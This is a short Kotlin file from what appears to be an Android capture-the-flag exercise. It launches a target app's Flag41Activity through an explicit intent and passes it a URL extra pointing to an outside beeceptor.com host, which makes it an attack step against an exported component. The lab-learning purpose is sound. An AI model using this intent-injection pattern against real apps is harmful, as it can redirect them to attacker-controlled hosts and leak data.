package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.util.Log
import kotlin.io.path.Path
import kotlin.io.path.listDirectoryEntries

object Flag41 {
    fun getFlag(context: Context) {
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag41Activity"
            )
            putExtra("URL", "https://hextree.free.beeceptor.com/flag41")
        }
        context.startActivity(intent)
    }
}
